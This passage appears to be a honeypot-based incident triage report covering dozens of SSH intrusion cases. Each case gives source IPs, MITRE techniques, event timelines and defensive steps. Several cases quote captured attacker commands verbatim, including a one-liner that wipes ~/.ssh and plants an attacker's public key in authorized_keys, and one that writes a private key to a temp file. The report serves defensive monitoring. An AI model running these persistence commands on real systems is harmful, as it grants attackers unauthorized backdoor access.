| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:41:31` | `cowrie.session.connect` |
| `2026-10-13 03:41:31` | `cowrie.client.version` |
| `2026-10-13 03:41:31` | `cowrie.client.kex` |
| `2026-10-13 03:41:31` | `cowrie.login.success` |
| `2026-10-13 03:41:32` | `cowrie.session.params` |
| `2026-10-13 03:41:32` | `cowrie.command.input` |
| `2026-10-13 03:41:32` | `cowrie.command.failed` |
| `2026-10-13 03:41:32` | `cowrie.log.closed` |
| `2026-10-13 03:41:33` | `cowrie.session.params` |
| `2026-10-13 03:41:33` | `cowrie.command.input` |
| `2026-10-13 03:41:33` | `cowrie.session.file_download` |
| `2026-10-13 03:41:33` | `cowrie.log.closed` |
| `2026-10-13 03:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.224.220[.]16` to AbuseIPDB if not already reported
- [ ] Block `177.224.220[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef0a7efd197f

| Field | Detail |
|---|---|
| **Source IP** | `177.224.220[.]16` |
| **First Seen** | 2026-10-13 03:41 |
| **Last Seen** | 2026-10-13 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:41:33` | `cowrie.session.connect` |
| `2026-10-13 03:41:33` | `cowrie.client.version` |
| `2026-10-13 03:41:33` | `cowrie.client.kex` |
| `2026-10-13 03:41:33` | `cowrie.login.success` |
| `2026-10-13 03:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.224.220[.]16` to AbuseIPDB if not already reported
- [ ] Block `177.224.220[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d0854f1c4ae

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]44` |
| **First Seen** | 2026-10-13 03:49 |
| **Last Seen** | 2026-10-13 03:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 03:49:05` | `cowrie.session.connect` |
| `2026-10-13 03:49:05` | `cowrie.client.version` |
| `2026-10-13 03:49:05` | `cowrie.client.kex` |
| `2026-10-13 03:49:09` | `cowrie.login.success` |
| `2026-10-13 03:49:14` | `cowrie.session.params` |
| `2026-10-13 03:49:14` | `cowrie.command.input` |
| `2026-10-13 03:49:16` | `cowrie.log.closed` |
| `2026-10-13 03:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]44` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11793084bf5a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]44` |
| **First Seen** | 2026-10-13 04:00 |
| **Last Seen** | 2026-10-13 04:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:00:04` | `cowrie.session.connect` |
| `2026-10-13 04:00:05` | `cowrie.client.version` |
| `2026-10-13 04:00:05` | `cowrie.client.kex` |
| `2026-10-13 04:00:05` | `cowrie.login.success` |
| `2026-10-13 04:00:06` | `cowrie.session.params` |
| `2026-10-13 04:00:06` | `cowrie.command.input` |
| `2026-10-13 04:00:07` | `cowrie.log.closed` |
| `2026-10-13 04:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]44` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-692c818b16b8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]48` |
| **First Seen** | 2026-10-13 04:03 |
| **Last Seen** | 2026-10-13 04:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:03:24` | `cowrie.session.connect` |
| `2026-10-13 04:03:24` | `cowrie.client.version` |
| `2026-10-13 04:03:25` | `cowrie.client.kex` |
| `2026-10-13 04:03:25` | `cowrie.login.success` |
| `2026-10-13 04:03:26` | `cowrie.session.params` |
| `2026-10-13 04:03:26` | `cowrie.command.input` |
| `2026-10-13 04:03:27` | `cowrie.log.closed` |
| `2026-10-13 04:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]48` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9299a511a281

| Field | Detail |
|---|---|
| **Source IP** | `160.250.132[.]238` |
| **First Seen** | 2026-10-13 04:09 |
| **Last Seen** | 2026-10-13 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:09:10` | `cowrie.session.connect` |
| `2026-10-13 04:09:10` | `cowrie.client.version` |
| `2026-10-13 04:09:10` | `cowrie.client.kex` |
| `2026-10-13 04:09:11` | `cowrie.login.success` |
| `2026-10-13 04:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.250.132[.]238` to AbuseIPDB if not already reported
- [ ] Block `160.250.132[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8adf27a1d7

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-13 04:09 |
| **Last Seen** | 2026-10-13 04:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:09:11` | `cowrie.session.connect` |
| `2026-10-13 04:09:11` | `cowrie.client.version` |
| `2026-10-13 04:09:12` | `cowrie.client.kex` |
| `2026-10-13 04:09:12` | `cowrie.login.success` |
| `2026-10-13 04:09:13` | `cowrie.session.params` |
| `2026-10-13 04:09:13` | `cowrie.command.input` |
| `2026-10-13 04:09:14` | `cowrie.session.file_download` |
| `2026-10-13 04:09:14` | `cowrie.session.file_download` |
| `2026-10-13 04:09:14` | `cowrie.log.closed` |
| `2026-10-13 04:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-531b5152a31d

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]187` |
| **First Seen** | 2026-10-13 04:21 |
| **Last Seen** | 2026-10-13 04:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:21:47` | `cowrie.session.connect` |
| `2026-10-13 04:21:47` | `cowrie.client.version` |
| `2026-10-13 04:21:47` | `cowrie.client.kex` |
| `2026-10-13 04:21:48` | `cowrie.login.success` |
| `2026-10-13 04:21:50` | `cowrie.session.params` |
| `2026-10-13 04:21:50` | `cowrie.command.input` |
| `2026-10-13 04:21:50` | `cowrie.command.failed` |
| `2026-10-13 04:21:51` | `cowrie.log.closed` |
| `2026-10-13 04:21:51` | `cowrie.session.params` |
| `2026-10-13 04:21:51` | `cowrie.command.input` |
| `2026-10-13 04:21:52` | `cowrie.session.file_download` |
| `2026-10-13 04:21:52` | `cowrie.log.closed` |
| `2026-10-13 04:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554a7d6f8427

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]187` |
| **First Seen** | 2026-10-13 04:21 |
| **Last Seen** | 2026-10-13 04:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:21:52` | `cowrie.session.connect` |
| `2026-10-13 04:21:52` | `cowrie.client.version` |
| `2026-10-13 04:21:52` | `cowrie.client.kex` |
| `2026-10-13 04:21:54` | `cowrie.login.success` |
| `2026-10-13 04:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06337c250206

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-13 04:25 |
| **Last Seen** | 2026-10-13 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:25:39` | `cowrie.session.connect` |
| `2026-10-13 04:25:39` | `cowrie.client.version` |
| `2026-10-13 04:25:39` | `cowrie.client.kex` |
| `2026-10-13 04:25:39` | `cowrie.login.success` |
| `2026-10-13 04:25:39` | `cowrie.direct-tcpip.request` |
| `2026-10-13 04:25:40` | `cowrie.direct-tcpip.data` |
| `2026-10-13 04:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-addbeba9149f

| Field | Detail |
|---|---|
| **Source IP** | `175.155.122[.]208` |
| **First Seen** | 2026-10-13 04:33 |
| **Last Seen** | 2026-10-13 04:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:33:06` | `cowrie.session.connect` |
| `2026-10-13 04:33:06` | `cowrie.client.version` |
| `2026-10-13 04:33:07` | `cowrie.client.kex` |
| `2026-10-13 04:33:08` | `cowrie.login.success` |
| `2026-10-13 04:33:09` | `cowrie.session.params` |
| `2026-10-13 04:33:09` | `cowrie.command.input` |
| `2026-10-13 04:33:09` | `cowrie.command.failed` |
| `2026-10-13 04:33:10` | `cowrie.log.closed` |
| `2026-10-13 04:33:10` | `cowrie.session.params` |
| `2026-10-13 04:33:10` | `cowrie.command.input` |
| `2026-10-13 04:33:11` | `cowrie.session.file_download` |
| `2026-10-13 04:33:11` | `cowrie.log.closed` |
| `2026-10-13 04:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.155.122[.]208` to AbuseIPDB if not already reported
- [ ] Block `175.155.122[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcda51e0cb2d

| Field | Detail |
|---|---|
| **Source IP** | `175.155.122[.]208` |
| **First Seen** | 2026-10-13 04:33 |
| **Last Seen** | 2026-10-13 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-13 04:33:11` | `cowrie.session.connect` |
| `2026-10-13 04:33:11` | `cowrie.client.version` |
| `2026-10-13 04:33:12` | `cowrie.client.kex` |
| `2026-10-13 04:33:13` | `cowrie.login.success` |
| `2026-10-13 04:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.155.122[.]208` to AbuseIPDB if not already reported
- [ ] Block `175.155.122[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (126) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-1ee163c044e0 | HIGH | `223.93.164[.]218` | 2026-10-13 04:37 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-dd7441d86d38 | HIGH | `45.79.207[.]111` | 2026-10-13 04:40 | Y | 0 | 0 | `T1078` |
| IR-e4db04808f0f | HIGH | `92.118.39[.]50` | 2026-10-13 04:56 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-ae70eb59809f | HIGH | `4.224.40[.]94` | 2026-10-13 05:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-adf8ea92ee0e | HIGH | `4.224.40[.]94` | 2026-10-13 05:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5e595abb2ee3 | HIGH | `203.205.37[.]233` | 2026-10-13 05:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a4c86c0ed416 | HIGH | `203.205.37[.]233` | 2026-10-13 05:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-01ba4b9c89ea | HIGH | `103.86.180[.]10` | 2026-10-13 05:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bef36b0a3bc4 | HIGH | `103.86.180[.]10` | 2026-10-13 05:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-359fd9cb0a5c | HIGH | `172.190.220[.]228` | 2026-10-13 05:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c7674807170 | HIGH | `172.190.220[.]228` | 2026-10-13 05:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61b6a1679d69 | HIGH | `120.48.112[.]221` | 2026-10-13 05:23 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-ff40ba749a2a | HIGH | `179.43.153[.]10` | 2026-10-13 05:38 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0a3678c61985 | HIGH | `109.160.32[.]143` | 2026-10-13 05:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-62ae1972c5c3 | HIGH | `94.180.139[.]162` | 2026-10-13 05:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4b10284f719b | HIGH | `94.180.139[.]162` | 2026-10-13 05:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4a9e16f2e5f1 | HIGH | `109.160.32[.]143` | 2026-10-13 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3054092525c2 | HIGH | `176.53.159[.]196` | 2026-10-13 06:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3468a37d30b0 | HIGH | `92.118.39[.]50` | 2026-10-13 06:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-1983b64ddec4 | HIGH | `216.155.93[.]75` | 2026-10-13 06:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c2c780b62541 | HIGH | `216.155.93[.]75` | 2026-10-13 06:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bb541e545074 | HIGH | `47.251.185[.]146` | 2026-10-13 06:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-316e488cf2a7 | HIGH | `130.12.180[.]51` | 2026-10-13 06:09 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-46aa793ad601 | HIGH | `109.160.32[.]169` | 2026-10-13 06:42 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c6a7b5ecd449 | HIGH | `193.32.162[.]84` | 2026-10-13 06:44 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-a1fada9e3bb1 | HIGH | `45.79.181[.]251` | 2026-10-13 06:52 | Y | 3 | 0 | `T1078` |
| IR-51762f0c0b42 | HIGH | `64.225.72[.]42` | 2026-10-13 07:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3fcde7679f90 | HIGH | `64.225.72[.]42` | 2026-10-13 07:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-035f219e969f | HIGH | `50.114.236[.]89` | 2026-10-13 07:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8f1dc0a1b63c | HIGH | `50.114.236[.]89` | 2026-10-13 07:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-41148c97c52a | HIGH | `20.40.44[.]6` | 2026-10-13 07:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d9bdfd64373c | HIGH | `20.40.44[.]6` | 2026-10-13 07:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c46febd4ab44 | HIGH | `179.43.153[.]10` | 2026-10-13 07:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9427c73aeec8 | HIGH | `4.182.219[.]135` | 2026-10-13 07:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cfac31239ebf | HIGH | `4.182.219[.]135` | 2026-10-13 07:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bbf20eb1369c | HIGH | `212.56.213[.]212` | 2026-10-13 07:26 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2207126bc55a | HIGH | `212.56.213[.]212` | 2026-10-13 07:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-46e84121ce79 | HIGH | `120.48.176[.]104` | 2026-10-13 07:29 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-1a8bb2c8b887 | HIGH | `103.43.191[.]43` | 2026-10-13 07:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c562c62fe350 | HIGH | `103.43.191[.]43` | 2026-10-13 07:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-99198e67ff33 | HIGH | `94.20.62[.]126` | 2026-10-13 07:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2459c3c373ac | HIGH | `94.20.62[.]126` | 2026-10-13 07:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e89f28874ee8 | HIGH | `50.84.211[.]204` | 2026-10-13 07:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c4757e08027 | HIGH | `50.84.211[.]204` | 2026-10-13 07:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6723646f52f2 | HIGH | `176.53.159[.]196` | 2026-10-13 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6356e46e5e0e | HIGH | `109.160.32[.]162` | 2026-10-13 09:04 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d6f506228f52 | HIGH | `80.94.92[.]179` | 2026-10-13 09:08 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-5482fccae0a4 | HIGH | `159.223.97[.]218` | 2026-10-13 09:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-caad3ecf0eb7 | HIGH | `159.223.97[.]218` | 2026-10-13 09:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-858fa931d8e6 | HIGH | `47.77.217[.]213` | 2026-10-13 09:18 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-f899628f6667 | HIGH | `120.26.202[.]34` | 2026-10-13 09:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8833ca0557d5 | HIGH | `69.6.222[.]101` | 2026-10-13 09:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-90baf14f3cd9 | HIGH | `69.6.222[.]101` | 2026-10-13 09:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ab48fb583b9f | HIGH | `129.226.202[.]180` | 2026-10-13 09:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ca800471a5da | HIGH | `109.160.32[.]154` | 2026-10-13 09:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8c4328011d1c | HIGH | `129.226.202[.]180` | 2026-10-13 09:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b171ab7393c3 | HIGH | `66.116.237[.]85` | 2026-10-13 09:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eeda6ee19e32 | HIGH | `66.116.237[.]85` | 2026-10-13 09:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-757b8770f601 | HIGH | `109.160.32[.]154` | 2026-10-13 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-362c4b08a765 | HIGH | `109.160.32[.]139` | 2026-10-13 10:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-cf0446c6d582 | HIGH | `80.94.92[.]179` | 2026-10-13 10:02 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-50f959069e50 | HIGH | `59.11.42[.]221` | 2026-10-13 10:28 | Y | 6 | 0 | `T1078` |
| IR-a0f2625d2d9d | HIGH | `179.43.153[.]10` | 2026-10-13 10:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c5d8a86facad | HIGH | `59.11.42[.]221` | 2026-10-13 10:28 | Y | 4 | 0 | `T1078` |
| IR-2ad92b274621 | HIGH | `40.117.97[.]0` | 2026-10-13 10:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d69c53f3d7ee | HIGH | `40.117.97[.]0` | 2026-10-13 10:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-313d493710aa | HIGH | `195.239.40[.]213` | 2026-10-13 10:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7f7356debf56 | HIGH | `195.239.40[.]213` | 2026-10-13 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ba4eb2ac48ab | HIGH | `109.160.32[.]165` | 2026-10-13 11:05 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fc743f6d581a | HIGH | `144.22.238[.]238` | 2026-10-13 11:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4730e25ee285 | HIGH | `176.53.159[.]196` | 2026-10-13 11:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dc2a1c914f88 | HIGH | `157.66.47[.]161` | 2026-10-13 11:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9c3481d8a5d9 | HIGH | `157.66.47[.]161` | 2026-10-13 11:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8be1c89725a3 | HIGH | `157.230.119[.]196` | 2026-10-13 12:02 | Y | 0 | 0 | `T1078` |
| IR-d18ab191aa71 | HIGH | `157.230.119[.]196` | 2026-10-13 12:03 | Y | 8 | 0 | `T1078` |
| IR-704dc3a364bb | HIGH | `164.90.239[.]35` | 2026-10-13 12:04 | Y | 3 | 0 | `T1078` |
| IR-f65b4ecbac4e | HIGH | `176.53.159[.]196` | 2026-10-13 12:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-80517fa14295 | HIGH | `125.94.106[.]195` | 2026-10-13 12:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f9ef39d38611 | HIGH | `125.94.106[.]195` | 2026-10-13 12:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ad05fd56047e | HIGH | `199.165.159[.]49` | 2026-10-13 12:34 | Y | 3 | 0 | `T1078` |
| IR-372c56f5eac5 | HIGH | `45.148.10[.]61` | 2026-10-13 12:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0b323df8f8f5 | HIGH | `20.89.68[.]9` | 2026-10-13 12:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e6196d2daa89 | HIGH | `20.89.68[.]9` | 2026-10-13 12:51 | Y | 0 | 0 | `T1078 · T1592` |
